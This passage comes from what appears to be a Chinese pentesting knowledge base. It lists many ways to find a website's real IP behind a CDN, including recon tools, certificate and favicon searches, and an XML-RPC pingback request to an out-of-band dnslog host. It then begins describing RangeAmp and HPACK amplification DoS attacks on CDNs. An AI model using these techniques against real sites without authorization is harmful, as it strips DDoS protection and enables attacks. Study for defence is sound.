'--zoomeye-username', dest='zoomeyeusername', help='The username of your zoomeye account') parser.add_option('--zpassword', '--zoomeye-password', dest='zoomeyepassword', help='The password of your zoomeye account') parser.add_option('--cuid', '--censys-uid', dest='censysuid', help=\"The uid of your censys account\") parser.add_option('--csecret', '--censys-secret', dest='censyssecret', help='The secret of your censys account') (options, args) = parser.parse_args() 不难发现 通过 HTTPS 证书透明度、域传送漏洞 等功能均未实现。 ESD 目前仅支持 Linux 系统，这是其源码决定的，不过我们可以 DIY 让它支持 windows 可以看到，engine.py 引擎脚本中，写死了目录是 /tmp/esd ，如果要在 windows 上使用，我们只需要替换这里为 windows 的输出目录即可。 # write output tmp_dir = 'C:\\\\temp\\\\' if not os.path.isdir(tmp_dir): os.mkdir(tmp_dir, 0o777) output_path_with_time = '{td}/.{domain}_{time}.esd'.format(td=tmp_dir, domain=self.domain, time=datetime.datetime.now().strftime(\"%Y-%m_%d_%H-%M\")) output_path = '{td}/.{domain}.esd'.format(td=tmp_dir, domain=self.domain) if len(self.data): max_domain_len = max(map(len, self.data)) + 2 else: max_domain_len = 2 output_format = '%-{0}s%-s\\n'.format(max_domain_len) with open(output_path_with_time, 'w') as opt, open(output_path, 'w') as op: for domain, ips in self.data.items(): # The format is consistent with other scanners to ensure that they are # invoked at the same time without increasing the cost of # resolution if ips is None or len(ips) == 0: ips_split = '' else: ips_split = ','.join(ips) con = output_format % (domain, ips_split) op.write(con) opt.write(con) 3.Layer 子域名挖掘机 项目地址：https://hub.fastgit.org/euphrat1ca/LayerDomainFinder/releases/tag/3 Seay 法师的作品，很早就有了，非常强大的一款 windows 上的 GUI 图形化工具，经历了数个版本的迭代，官方最新版是5.0，当然还有不计其数的网友自定义修改版本在野流传。 4.Xray 项目地址：https://github.com/chaitin/xray xray 是一款强大的安全评估工具，一款自动化扫描器，我们可以用其自带的 subdomain 子域名发掘功能来针对性探测： subdomain 功能支持暴力破解模式和非暴力模式，可以只探测 web 服务或者只探测 ip 可解析的子域，另外支持 webhook 数据传递，作为插件端或者分发消息的接收端来使用都非常方便快捷。 5.Bypass-firewalls-by-DNS-history 项目地址：https://github.com/vincentcox/bypass-firewalls-by-DNS-history Bypass-firewalls-by-DNS-history 是一款集成全自动化的探测工具，通过探测 DNS 历史记录，搜索旧的 DNS A Record，收集子域，并检查服务器是否对该域名进行答复。 另外它还基于源服务器和防火墙在HTML响应中的相似性阈值来判断。 用法： bash bypass-firewalls-by-DNS-history.sh -d example.com -d --domain: domain to bypass -o --outputfile: output file with IP's -l --listsubdomains: list with subdomains for extra coverage -a --checkall: Check all subdomains for a WAF bypass 此外，类似的还有 subfinder 、dnsprobe 等等工具，有兴趣的读者可以自行去研究了解其工作原理和机制。 二、通过 Email 邮局 一般大型网站自己部署架设的邮件服务器如果向外部用户发送邮件的话，如果中间未经任何数据处理和防护措施，那么邮件头部的源码中会包含此邮件服务器的真实 IP 地址。常见的邮件触发点有： RSS 订阅 邮箱注册、激活处 邮箱找回密码处 产品更新的邮件推送 某业务执行后发送的邮件通知 员工邮箱、邮件管理平台等入口处的忘记密码 另外这里还有一个奇淫技巧，通过发送邮件给一个不存在的邮箱地址，比如 000xxx@domain.com ，因为该用户不存在，所以发送将失败，并且还会收到一个包含发送该电子邮件给你的服务器的真实 IP 通知。 生产上多关注这些点，一个不成功继续测试下一个邮件触发点，很多大型网站的邮件服务器不止一台，并不是所有都做了防护处理，细节决定成败。 三、通过 SSL 证书 证书颁发机构 (CA) 必须将他们发布的每个 SSL/TLS 证书发布到公共日志中，SSL/TLS 证书通常包含域名、子域名和电子邮件地址。因此可以利用 SSL/TLS 证书来发现目标站点的真实 IP 地址。 CDN 运营商在给服务器提供保护的同时，也会与其服务器进行加密通信（ssl），这时当服务器的 443 端口接入域名时也会在 443 端口暴露其证书，我们通过证书比对便可发现网站的真实 IP 地址。 1.利用 Censys 引擎（https://censys.io/） Censys 搜索引擎能够扫描整个互联网，每天都会扫描 IPv4 地址空间，以搜索所有联网设备并收集相关的信息，可以利用 Censys 进行全网方面的 SSL 证书搜索，找到匹配的真实 IP 。 可以看到，当我们针对一个互联网 IP 地址进行搜索时，是有匹配到证书 sha1 签名的 同理，我们根据域名指纹搜索 SSL 证书指纹，然后再反查 IP 就可以了。 首先针对目标域名，选择 Certificates 证书搜索，结果出来一堆 有效 的证书和 无效 的证书： 测试过程中，很容易陷入思维误区，认为 有效 的证书才是我们需要的，但其实并不一定，很多服务器配置错误依然保留的是 无效 的证书，就比如例子中，在结果特别多的情况下，我又使用 Censys 的语法搜索，来精准定位 有效 SSL 证书，减少结果： parsed.names: xxx.com and tags.raw: trusted 瞬间减少到了 2 个结果，我们逐个点开，然后 sha1 签名反查 IPV4 主机： 不过很遗憾，两条记录全都没查到： 这也从侧面说明了，不是所有的网站只有其 有效 证书会匹配其 IP 服务器。 于是只能回到最开始，从所有的结果里面依次打开往下反查指纹，最终定位到了真实 IP ： 安全不仅是个技术活，也是个细心活。 2.使用命令行 通过 openssl 和 curl 等常见的基础命令，也同样可以达到反查 SSL 证书的效果。 openssl： openssl s_client -connect 123.123.123.123:443 | grep subject curl： curl -v https://123.123.123.123 | grep 'subject' 3.使用工具和脚本 通过自己写工具脚本，集成前面的1、2两点，完全可以做到一个简易版的 SSL 全网证书爬取，也可以利用现有的一些脚本工具和网站，省的我们自己费力了。 例如 CloudFlair ，项目地址：https://github.com/christophetd/CloudFlair 脚本兼容 python2.7 和 3.5，需要配置 Censys API，不过只针对目标网站是否使用 CloudFlare 服务进行探测。 在 Censys 注册一个账号并进入 https://censys.io/account/api 获取 API ID 和 Secret： 将 CloudFlair 克隆到本地并把 API ID 和 Secret 导入环境变量： $ git clone https://github.com/christophetd/CloudFlair $ export CENSYS_API_ID=\"xxx\" $ export CENSYS_API_SECRET=\"xxx\" 通过 requirements.txt 安装依赖： $ pip install -r requirements.txt 运行 cloudflair.py ： $ python cloudflair.py --censys-api-id xxx --censys-api-secret xxx baidu.com [*] The target appears to be behind CloudFlare. [*] Looking for certificates matching \"myvulnerable.site\" using Censys [*] 75 certificates matching \"myvulnerable.site\" found. [*] Looking for IPv4 hosts presenting these certificates... [*] 10 IPv4 hosts presenting a certificate issued to \"myvulnerable.site\" were found. - 51.194.77.1 - 223.172.21.75 - 18.136.111.24 - 127.200.220.231 - 177.67.208.72 - 137.67.239.174 - 182.102.141.194 - 8.154.231.164 - 37.184.84.44 - 78.25.205.83 [*] Retrieving target homepage at https://myvulnerable.site [*] Testing candidate origin servers - 51.194.77.1 - 223.172.21.75 - 18.136.111.24 responded with an unexpected HTTP status code 404 - 127.200.220.231 timed out after 3 seconds - 177.67.208.72 - 137.67.239.174 - 182.102.141.194 - 8.154.231.164 - 37.184.84.44 - 78.25.205.83 [*] Found 2 likely origin servers of myvulnerable.site! - 177.67.208.72 (HTML content identical to myvulnerable.site) - 182.102.141.194 (HTML content identical to myvulnerable.site) 其实完全可以通过 Censys 提供的 API 自己集成一款简洁实用的全自动化探测脚本，如果后面我有时间写好了，会同步更新到这里的。 4.证书收集 可以通过 https://crt.sh 进行快速证书查询收集 附上查询的 python 小脚本： import requests import re TIME_OUT = 60 def get_SSL(domain): domains = [] url = 'https://crt.sh/?q=%25.{}'.format(domain) response = requests.get(url,timeout=TIME_OUT) ssl = re.findall(\"(.*?).{}\".format(domain),response.text) for i in ssl: i += '.' + domain domains.append(i) print(domains) if __name__ == '__main__': get_SSL(\"baidu.com\") 获得所有包含证书的子域： 四、通过海外 DNS 查询 针对国内市场用户，大部分的 CDN 服务商并没有做海外市场的 CDN ，所以可以通过寻找小众、冷门的海外 DNS 查询，看是否能获得真实 IP 。 $ nslookup target.com 也可以使用海外的超级ping类的平台在线多国家多地区测试，推荐 https://www.host-tracker.com/v3/check/ ，支持 140 多个地区的 ping 测试，另外支持针对某子域超长期的监控，通过邮件通知，简直太强大了。 五、通过敏感文件泄露 包括但不限于： 服务器日志文件 探针文件，例如 phpinfo 网站备份压缩文件 .DS_Store .hg .git SVN Web.xml 字典非常重要，往往疏忽的点就在一台边缘服务器。 六、通过变更的域名 很多网站在发展的过程中，会更换域名，比如京东以前的域名是 360buy.com ，后来斥巨资购买了 jd.com 。 网站在更换新域名时，如果将 CDN 部署到新的域名上，而之前的域名由于没过期，可能未使用 CDN，因此可以直接获得服务器 IP，所以，历史域名也是一个很重要的点。 七、 通过 APP 移动端应用 如果网站存在 APP ，可以通过抓包分析其 APP 的数据流量，看是否能找到网站真实 IP 地址，记得关注 APP 的历史版本，里面会有很多 surprise 。 八、通过 F5 LTM 解码 LTM 是将所有的应用请求分配到多个节点服务器上。提高业务的处理能力，也就是负载均衡。 当服务器使用 F5 LTM 做负载均衡时，通过对 set-cookie 关键字的解码，可以获取服务器真实 ip 地址。 例如： Set-Cookie: BIGipServerpool_9.29_5229=605532106.22012.0000 先把第一小节的十进制数，即 605532106 取出来 将其转为十六进制数 2417afca 接着从后至前，取四个字节出来： CA AF 17 24 最后依次转为十进制数 202.175.23.36，即是服务器的真实 ip 地址。 九、通过 CDN 标头特征值 很多网站启用 CDN 后，配置了拒绝直接访问真实 IP ，比如 CloudFlare 的提示： 因此可以通过匹配特征标头的方法，去缩小范围，这里还是使用 Censys 查询： 语法: http.get.headers.server: eg: 80.http.get.headers.server:cloudflare 针对整个互联网的搜索 IP 结果进一步匹配，比如通过 端口、地理位置、banner 特征、反查邮箱、联系方式等等信息，继续精确结果： 十、通过 XML-RPC PINGBACK 通信 XML-RPC 是支持 WordPress 与其他系统之间通信的规范，它通过使用 HTTP 作为传输机制和 XML 作为编码机制来标准化这些通信过程。 在 WordPress 的早期版本中，默认情况下已关闭 XML-RPC，但是从3.5版本开始，默认情况下开启。 XML-RPC 支持 trackback 和 pingback。 虽然 WordPress 启用了 REST API 来代替 XML-RPC ，不过 XML-RPX 不会过时的，放心大胆的使用就好，虽然 XML-RPC 这个技术很老了，但依然可以通杀很多网站。 配置好 dnslog，POST 请求 XML-RPC： POST /xmlrpc.php HTTP/1.1 Host: domain.com Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: en,zh-CN;q=0.9,zh;q=0.8 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 323 pingback.ping http://2vbis4.dnslog.cn https://domain.com/ 响应： 刷新一下 dnslog ，获得了真实服务器 IP： 十一、通过 FTP/SCP 协议 在很多情况下，网站需要将数据流从外部传输到内部服务器上，最安全的做法肯定是在用户和服务器之间建立虚拟专用网络（V*P+N 防和谐）。 但实际上，仍然有大量可从外部访问的 FTP / SCP 服务，从而容易被抓住机会找到源 IP 地址。 十二、利用 Websocket 协议 CloudFlare 等 CDN 服务商其实早就支持对 Websocket 的保护了，但太多的站长，不管大站小站，他们很多人都不知道，或者没有针对 Websocket 进行部署。 另一种原因是因为业务上的需求，毕竟 Websocket 要求客户端和服务器之间保持长久的连接，所以很有可能没有进行 CDN 部署。 十三、通过社会工程学 凯伦·王，21世纪初杰出初思想家、哲学家、社会学家、经济学家，社会工程学的鼻祖，括弧，自称的。 http://www.333ttt.com/up/up2103510950.html，熟悉的 BGM 响起来，好似又回到了辣一段青葱岁月。 估计有人笑了，不过啊，可真别小看社工的威力，有多少大厂、运营商是倒在了社会工程学脚下的，邮件钓鱼、水坑攻击、物理社工、身份伪装、客服欺骗、商务咨询 等等，案例数不胜数，不胜枚举。 因为人不是机器，只要是人，那就一定存在漏洞。 哦对，顺带推荐部电影，小李子的《猫鼠游戏》。 十四、通过网站漏洞 如果目标网站本身存在漏洞的话，比如 SSRF、XXE、XSS、文件上传、命令执行等漏洞，或者我们找到的其他突破口，注入我们自己的带外服务器地址，然后在服务器上检查 HTTP 日志记录。 应用本身的错误会造成当传递一些错误的参数值或者错误的地址时，内部会抛出异常，也就是日常所说的报错，关注报错点，经常会泄露一些真实的 IP 地址或者内网 IP 段。 十五、通过全网扫描 什么年代了啊，怎么还在说全网扫描。为了写全方法，这里还是提一下。 首先从 apnic 网络信息中心 或 IPdeny 获取目标地区 ip 段。 接着使用 Zmap、masscan 等工具对扫描出来端口开放的主机进行 banner 爬取。 然后在 http-req 的 Host 字段，写入我们需要寻找的子域。 最后过滤特征，确认是否有对应的服务器响应。 哦对了，如果端口不是常见或者固定，当场退役。 实际上，全网扫描的方法十分笨重，不推荐。因为已经有很多的网站给我们提供了全网爬取服务，之前的方法里都有介绍到，何必自己全网扫描呢，受限于网络、受限于设备，你个人爬的数据能有人家商业爬的全吗？ 十六、通过 virtual-host 碰撞 当我们收集了目标足够多的可能的真实 IP 时，可以通过 IP 和子域的碰撞，来批量获得命中目标以及目标哪些的子域。 IP 正确，子域错误： IP 正确，子域正确： IP 错误，子域正确： 自动化的过程可以使用 virtual-host-discovery 工具，项目地址：https://github.com/jobertabma/virtual-host-discovery 克隆到本地 $ git clone https://github.com/jobertabma/virtual-host-discovery 使用方法： $ ruby scan.rb --ip=x.x.x.x --host=domain --wordlist= 其中wordlsit 参数可以省略，默认有一个字典加载，使用该参数则是指定我们自己想要跑的子域列表。 执行后，即可快速找出命中 IP 的子域 另外可以通过 find-virtual-hosts （https://pentest-tools.com/information-gathering/find-virtual-hosts#）工具来在线快速针对全网数据扫描比对得出结果： 十七、通过 favicon.ico 哈希特征 favicon.ico 是现代浏览器在网页标题的左侧显示的一个小图标。 该图标数据通常是从 https://anywebsite/favicon.ico 处获取的，浏览器会在浏览任何网站时自动请求它。 因为可以通过计算 favicon.ico 的指纹哈希，然后去 shodan 等搜索引擎搜索与之相同的主机结果，从而进一步探测是否能挖掘出目标网站的真实 IP 地址。 计算 favicon.ico 哈希的小脚本： python 2 import mmh3 import requests response = requests.get('https://domain.com/favicon.ico') favicon = response.content.encode('base64') hash = mmh3.hash(favicon) print hash python 3 import mmh3 import requests import codecs response = requests.get('https://domain.com/favicon.ico') favicon = codecs.encode(response.content,\"base64\") hash = mmh3.hash(favicon) print(hash) 安装好环境依赖后执行脚本，计算得到目标网站的 favicon.ico 哈希值： $ apt-get install build-essential $ apt-get install gcc $ apt-get install g++ $ python 3.py 然后用 shodan 搜索引擎搜索哈希，去命中 IP： $ proxychains shodan search http.favicon.hash:1730752770 --fields ip_str,port --separator \" \" | awk '{print $1\": 另外值得一提的是，渗透过程中同样可以根据 favicon 哈希、子域、IP 的命中，做好指纹排序并整理，另外做一张常见的中间件或者组件指纹哈希表，分类进行资产快速命中： 十八、通过网页源码特征值 在服务器源 IP 地址允许访问并且返回的也是类似的网站内容情况下，可以通过侦察页面源码中 JS 、CSS 、HTML 等一系列静态特征值，然后用 Shodan 、Zoomeye 、Censys 等搜索引擎进行匹配搜索，从而定位 IP 。 例如源码中找到一段 Google Analytics 的 JS 特征： 然后 shodan 搜索这些代码特征： http.html:UA-XXXXX-X http.html:GTM-XXXXXX 定位到了服务器源 IP ： 十九、通过网站远程资源业务 多找一下目标网站上支持远程图片、远程文件等被动连接的业务地方，通过注入我们自己服务器的资源文件，然后查看 HTTP 日志来定位目标服务器的连接。 常见的比如加载远程头像处。 二十、通过 CDN 机器 有些网站是自搭建 CDN 机器做负载均衡的，很难保证每一台 CDN 机器都做到 100% 安全。没有办法的情况下，可以尝试针对这些 CDN 机器进行渗透测试，如果能拿下一台，就什么都有了，目标主站的安全性好并不代表所有的生产边路都不存在缺陷，安全不在于真正强的地方有多强，而在于薄弱的地方有多弱。 二十一、通过流量耗尽、流量放大攻击 CDN 是收费的，那么其流量一定是有限的，对一些不是超大型目标网站在进行测试时，注意，一定要在项目方授权允许的情况下，可以尝试进行 ddos 流量测试。 CDN 流量耗尽了，就不存在内容分发了，直接就可以拿到源 IP 。 但是，CDN 是流量穿透的，别流量耗尽前，目标网站先 gg 了。 另一种比较古老的做法是通过 CDN 设置中的自身缺陷，将要保护的源站 IP 设置成为 CDN 节点的地址，致使 CDN 流量进入死循环，一层层放大后，最终自己打死自己。不过大多数的 CDN 厂商早已限制禁止将 CDN 节点设置成 CDN 节点 IP ，并且启用了自动丢包保护机制。 二十二、通过域名备案信息广域探测 针对目标域名，目标二级域名，如果都做了 CDN 的情况下，是不是就思路中断了呢？ 肯定不是。这里分享一个很少有人去关注的独门秘技。 网站需要服务器，但是再土豪的公司，也不可能一个域名一台服务器，大多数情况下，都是多个域名业务，共用一台服务器。 那么如果目标网站存在备案，可以查询其备案信息，收集该单位或者个人备案的其他网站域名以及其他子域，然后再进行一轮广域的探测，很有可能其中的某个边缘子域，没有做 CDN，就直接暴露了真实服务器的 IP 地址，然后再进一步验证该 IP 是否也是目标网站的真实 IP 。 特别提一哈，此方法成功率特别的高，而且找到的速度非常的快，所以写在后面，有毅力坚持读下来的同学可以看到。 二十三、利用 CDN 服务商默认配置 不同的 CDN 服务商，产品默认配置不同。 例如 CloudFlare ，默认配置 direct.domain.com 二级子域指向服务器源 IP。但是很多公司或者个人使用 CDN 保护的时候并没有修改默认配置，导致 IP 泄露风险。 其他一些高风险的子域如 ftp、mail、cpanel、direct-connect 等也可以重点关注，方便快速定位，毕竟众测里时间就是金钱。 二十四、通过 SSH 指纹 跑题了，SSH 指纹一般应用于匿名 Tor 网络追踪 二十五、使用 CloudFair 工具 如果你的目标是 CloudFlare 保护的，建议先上这款工具跑。 CloudFail 是一种战术侦察工具，旨在收集有关受 Cloudflare 保护的目标的足够信息，以期发现服务器的 IP 位置。 该工具目前探测经过3个不同的攻击阶段： 1.使用 DNSDumpster.com 扫描 DNS 配置错误。 2.扫描和比对 Crimeflare.com 数据库。 3.内置字典暴力扫描超过11000个子域名。 安装和使用： $ git clone https://github.com/m0rtem/CloudFail $ pip install -r requirements.txt $ python cloudfail.py -t domain.com ____ _ _ _____ _ _ / ___| | ___ _ _ __| | ___|_ _(_) | | | | |/ _ \\| | | |/ _` | |_ / _` | | | | |___| | (_) | |_| | (_| | _| (_| | | | \\____|_|\\___/ \\__,_|\\__,_|_| \\__,_|_|_| v1.0.2 by m0rtem [16:12:31] Initializing CloudFail - the date is: 07/01/2021 [16:12:31] Fetching initial information from: domain.com... [16:12:31] Server IP: 104.xx.x.76 [16:12:31] Testing if domain.com is on the Cloudflare network... [16:12:31] domain.com is part of the Cloudflare network! [16:12:31] Testing for misconfigured DNS using dnsdumpster... [16:12:35] [FOUND:HOST] domain.com HTTP: cloudflare TCP8080: cloudflare 172.xx.xx.62 CLOUDFLARENETUnited States United States [16:12:35] [FOUND:HOST] freelance.domain.com HTTP: cloudflare TCP8080: cloudflare 104.xx.xx.76 CLOUDFLARENETUnited States United States [16:12:35] [FOUND:HOST] www.freelance.domain.com HTTP: cloudflare TCP8080: cloudflare 104.xx.xx.76 CLOUDFLARENETUnited States United States [16:12:35] [FOUND:HOST] ctf.domain.com HTTP: nginx/1.10.3 HTTPS: nginx/1.10.3 SSH: SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7 185.231.245.55 TEAM-HOST AS Russia [16:12:35] [FOUND:HOST] www.ctf.domain.com HTTP: nginx/1.10.3 HTTPS: nginx/1.10.3 SSH: SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7 185.231.245.55 TEAM-HOST AS Russia [16:12:35] [FOUND:HOST] mail.domain.com 62.213.11.246 ROSTELECOM-ASRussia Russia [16:12:35] [FOUND:HOST] school.domain.com HTTP: cloudflare TCP8080: cloudflare 104.xx.xx.76 CLOUDFLARENETUnited States United States [16:12:35] [FOUND:HOST] www.school.domain.com HTTP: cloudflare TCP8080: cloudflare 104.xx.xx.76 CLOUDFLARENETUnited States United States [16:12:35] [FOUND:HOST] pentest.domain.com HTTP: cloudflare TCP8080: cloudflare 104.xx.xx.76 CLOUDFLARENETUnited States United States [16:12:35] [FOUND:HOST] www.pentest.domain.com HTTP: cloudflare TCP8080: cloudflare 104.xx.xx.76 CLOUDFLARENETUnited States United States [16:12:35] [FOUND:HOST] w.domain.com HTTP: nginx/1.6.2 HTTPS: nginx/1.6.2 SSH: SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u8 185.xx.xx.136 TEAM-HOST AS Russia [16:12:35] [FOUND:HOST] www.w.domain.com HTTP: nginx/1.6.2 HTTPS: nginx/1.6.2 SSH: SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u8 185.xx.xx.136 TEAM-HOST AS Russia [16:12:35] [FOUND:HOST] www.domain.com HTTP: cloudflare TCP8080: cloudflare 104.xx.xx.76 CLOUDFLARENETUnited States United States [16:12:35] [FOUND:HOST] pay.domain.com HTTP: cloudflare TCP8080: cloudflare 104.xx.xx.76 CLOUDFLARENETUnited States United States [16:12:35] [FOUND:HOST] www.pay.domain.com HTTP: cloudflare TCP8080: cloudflare 104.xx.xx.76 CLOUDFLARENETUnited States United States [16:12:35] [FOUND:DNS] tim.ns.cloudflare.com. 173.xx.xx.145 CLOUDFLARENETUnited States United States [16:12:35] [FOUND:DNS] tina.ns.cloudflare.com. 173.xx.xx.230 CLOUDFLARENETUnited States United States [16:12:35] [FOUND:MX] 62.xx.xx.246 ROSTELECOM-ASRussia 10 mail.domain.com. [16:12:35] [FOUND:MX] 62.xx.xx.246 ROSTELECOM-ASRussia 20 mail.domain.com. [16:12:35] Scanning crimeflare database... [16:12:36] [FOUND:IP] 62.xx.xx.230 [16:12:36] [FOUND:IP] 62.xx.xx.246 [16:12:36] Scanning 11219 subdomains (subdomains.txt), please wait... [16:15:52] [FOUND:SUBDOMAIN] mail.domain.com IP: 62.xx.xx.246 HTTP: 200 [16:16:13] [FOUND:SUBDOMAIN] pay.domain.com ON CLOUDFLARE NETWORK! [16:16:35] [FOUND:SUBDOMAIN] school.domain.com ON CLOUDFLARE NETWORK! [16:17:03] [FOUND:SUBDOMAIN] w.domain.com IP: 185.xx.xx.136 HTTP: 200 [16:17:10] [FOUND:SUBDOMAIN] www.domain.com ON CLOUDFLARE NETWORK! [16:17:14] Scanning finished... 闭眼休息一会，一会就跑出来了： 喜欢偷懒的同学可以使用在线查询：https://suip.biz/?act=cloudfail 已经将此工具集成到了后台，并做了前端 UI 页面供安全信息从业人员在线查询： 脚本执行的结果前端直接可以看到，另外提供 PDF 报告下载，这里我用的是 baidu.com 测试，因为 baidu.com 并没有使用 CloudFlare CDN ，所以速度很快。 如果是查询使用了 CloudFlare CDN 的域名，速度会比较慢，页面会置空，什么都不显示： 稍等一段时间就可以了，这里也给大家截个图，防止有同学误会工具不可以使用： 找到真实 IP 后如何使用 通过修改 hosts 文件，将域名和 IP 绑定。（要是不会，不建议阅读此文。） 如使用 burpsuite 测试，可以在 Project options ----> Connections ----> Hostname Resolution 中增加域名和 IP 记录。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-12 21:42:35 "},"知识库/01.WEB安全/00.信息收集/2.绕过CDN寻找真实IP/3.CDN_2021_完全攻击指南_2.html":{"url":"知识库/01.WEB安全/00.信息收集/2.绕过CDN寻找真实IP/3.CDN_2021_完全攻击指南_2.html","title":"3.CDN2021完全攻击指南_2","keywords":"","body":"HTTP范围放大攻击 范围放大攻击又称 Rangeamp，主要利用了HTTP协议中Range请求头的规范和特性来实现，针对目标网站，我们可以发送一个 HEAD 请求，来判断是否支持 Range 请求头 如果目标网站支持 Range 传输，则会返回 Accept-Ranges: bytes 当然，我们也可以直接加上 Range: bytes= 请求头去发送数据包，然后查看其是否返回我们指定请求的字节数据，注意响应状态，返回的是 206 Partial Content SBR小字节范围攻击 SBR小字节范围攻击主要是利用了请求和响应流量之间不对称的方式来进行放大攻击，客户端发送小字节（例如1字节）的Range范围请求，大多数CDN在接受到此类范围请求时，为了缓存优化、降低延迟和减少回源等，可能会采取删除Range头或者扩增请求字节的大小范围，然后再将处理后的HTTP请求发送给后端服务器。 这样一来，我们源请求和处理后的请求之间，会造成响应流量的严重倾斜，也就是不对称，其比值即为攻击放大的倍数。针对1024kb大小的资源来说，其放大倍数基本都在1000倍以上。 以下是实验中，目标资源大小分别为1MB、10MB和25MB时的流量放大倍数表： OBR重叠字节范围攻击 OBR利用了多范围请求，多范围Range请求如图所示： 客户端发送类似 Range: bytes=0-1,1-10,200-2000 的多范围HTTP请求，正常情况下，服务器返回的是分段处理后的响应流。 此时客户端请求的是一份资源，但是服务器对重叠范围请求处理后，返回的是 N * 资源大小的数据流量，单词请求压力是之前的 N 倍，因为服务器要做大量的运算和字符串处理，重叠范围请求的越多，压力越大，内存消耗越多。 但是大部分网站都遵循RFC7233标准对重叠范围请求做了处理和修正。 如图所示，当我们发起请求多个重叠范围时，返回的最大数据为我们的单次资源最大字节数，并不能无限消耗和放大。 但是在CDN中，有一些CDN并没有遵循标准，此时可以针对两台CDN节点做级联放大攻击，以此来打跨CDN节点。 客户端发送OBR请求给前端CDN，前端CDN节点不经过处理直接发送给后端CDN节点，后端CDN节点与源站，也就是与服务器的交互请求受限于服务器的RFC标准，此时服务器返回最大单个资源请求响应数据。 后端CDN收到单个资源数据后，因为并未遵循RFC标准，将响应的资源数据放大N倍后传递给前端CDN节点，OBR重叠范围的数目越多，请求压力就越大，最终造成DDOS攻击。 以下是级联CDN的实测流量放大倍数表： 基于协议转换的HPACK攻击 在 http/1.x 的版本中，请求的Header字段未被压缩，Header字段以字符串进行传输，在高并发的场景下，每个请求都携带了Header字段，浪费了带宽，增加了网络延迟。 针对这个问题，http/2.x 的版本对Header信息进行压缩编码，从而提高带宽利用率，这种压缩编码算法就是HAPCK。HPACK一种新型压缩器，可消除冗余的header字段，限制已知安全攻击的漏洞，并且在受限环境中使用有限的内存要求。 在 RFC7541 标准中可以具体的来看HPACK HPACK将HTTP请求的Header字段看作 name-value 的有序集合对，使用 2 个索引表（静态索引表、动态索引表）来把头部映射到索引值，并对不存在的头部使用哈夫曼编码，并动态缓存到索引，从而达到压缩头部的效果。 头部的内容包括了 Header Name 和 Header Value两部分，不同的类型包含了不同的内容。 静态表顾名思义，是预定义好的，总共有61对索引值，表如下： 动态表则是在每次HTTP请求中，由客户端进行扩充 k是可以增大的，每次在动态表中插入新的索引，新插入的 key-value 对的索引下标是s+1,动态表里的其他数据下标依次往后挪。 总的来说，HPACK的压缩和编码特性，结合CDN的前后协议不一致，将会造成新的攻击态势。 静态表的协议不对称放大攻击 针对源HTTP请求： GET / HTTP/1.1 Host: binmake.com Scheme: https 经过静态表编码压缩的过程： 可以看到，压缩后直接从原来的 52 字节压缩到了 16字节： 82 84 87 41 0B 62 69 6e 6d 61 6b 65 2e 63 6f 6d kali上我们可以用 nghttp2 自带的 h2load 来测试压缩效率 基本上所有的CDN都支持 HTTP2 协议，但不是所有的后端源服务器都支持。 所以利用前后端 HTTP 协议不一致造成的不对称差异，可以放大流量，制造拒绝服务攻击： 此时放大倍数约为3.3。 动态表的协议不对称放大攻击 针对源HTTP请求： GET / HTTP/1.1 Host: binmake.com Scheme: https Extension: ......(1000 bytes) 由于请求头中多出了 Extension 字段和1000字节的值，此时预定义的静态表中无法找到，那么HPACK就会使用扩展的动态表来记录： 注意，只有第一次请求的时候，需要未经压缩编码的扩展字段发送给 CDN ，CDN 在HPACK机制下，会将整个扩展字段在动态表中新增一条记录。 当再次请求同一资源时，CDN会检查匹配动态表是否命中： 后续的请求CDN 全部走动态表： 此时放大系数约为 62 倍，远远超过了静态表。 利用哈夫曼编码的协议不对称放大攻击 根据数据结构当中的树型结构，在哈夫曼算法的支持下构造出一棵最优二叉树，我们把这类树命名为哈夫曼树。哈夫曼编码是在哈夫曼树的基础之上构造出来的一种编码形式，一般应用于压缩和解压缩。 HPACK 对字符串的处理是支持哈夫曼编码的，见如下表： code code as bits as hex len sym aligned to MSB aligned in to LSB bits ( 0) |11111111|11000 1ff8 [13] ( 1) |11111111|11111111|1011000 7fffd8 [23] ( 2) |11111111|11111111|11111110|0010 fffffe2 [28] ( 3) |11111111|11111111|11111110|0011 fffffe3 [28] ( 4) |11111111|11111111|11111110|0100 fffffe4 [28] ( 5) |11111111|11111111|11111110|0101 fffffe5 [28] ( 6) |11111111|11111111|11111110|0110 fffffe6 [28] ( 7) |11111111|11111111|11111110|0111 fffffe7 [28] ( 8) |11111111|11111111|11111110|1000 fffffe8 [28] ( 9) |11111111|11111111|11101010 ffffea [24] ( 10) |11111111|11111111|11111111|111100 3ffffffc [30] ( 11) |11111111|11111111|11111110|1001 fffffe9 [28] ( 12) |11111111|11111111|11111110|1010 fffffea [28] ( 13) |11111111|11111111|11111111|111101 3ffffffd [30] Peon & Ruellan Standards Track [Page 27] RFC 7541 HPACK May 2015 ( 14) |11111111|11111111|11111110|1011 fffffeb [28] ( 15) |11111111|11111111|11111110|1100 fffffec [28] ( 16) |11111111|11111111|11111110|1101 fffffed [28] ( 17) |11111111|11111111|11111110|1110 fffffee [28] ( 18) |11111111|11111111|11111110|1111 fffffef [28] ( 19) |11111111|11111111|11111111|0000 ffffff0 [28] ( 20) |11111111|11111111|11111111|0001 ffffff1 [28] ( 21) |11111111|11111111|11111111|0010 ffffff2 [28] ( 22) |11111111|11111111|11111111|111110 3ffffffe [30] ( 23) |11111111|11111111|11111111|0011 ffffff3 [28] ( 24) |11111111|11111111|11111111|0100 ffffff4 [28] ( 25) |11111111|11111111|11111111|0101 ffffff5 [28] ( 26) |11111111|11111111|11111111|0110 ffffff6 [28] ( 27) |11111111|11111111|11111111|0111 ffffff7 [28] ( 28) |11111111|11111111|11111111|1000 ffffff8 [28] ( 29) |11111111|11111111|11111111|1001 ffffff9 [28] ( 30) |11111111|11111111|11111111|1010 ffffffa [28] ( 31) |11111111|11111111|11111111|1011 ffffffb [28] ' ' ( 32) |010100 14 [ 6] 